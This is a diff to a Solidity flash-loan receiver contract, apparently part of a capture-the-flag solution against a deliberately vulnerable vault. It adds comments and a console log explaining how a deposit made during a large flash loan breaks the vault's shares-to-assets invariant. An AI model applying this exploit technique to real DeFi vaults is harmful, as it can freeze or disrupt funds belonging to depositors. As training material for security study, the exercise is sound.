@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-
+import "forge-std/console.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "solmate/auth/Owned.sol";
 import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";
@@ -32,8 +32,14 @@ contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
             fee != 0
         ) revert UnexpectedFlashLoan();
 
-        // During the flash loan, make a deposit, which will disrupt the asset
-        // to supply ratio.
+        // During the flash loan (which should be greater than half of the
+        // totalSupply in order to manipulate the shares function), make a
+        // deposit, which will break the shares to assets ratio.
+
+        // You can see here that 2 shares will come out of depositing 1, which
+        // breaks the vaults 1-to-1 invariant.
+        console.log("preview", pool.previewDeposit(1));
+
         ERC20(token).approve(address(pool), 1);
         pool.deposit(1, address(this));
 
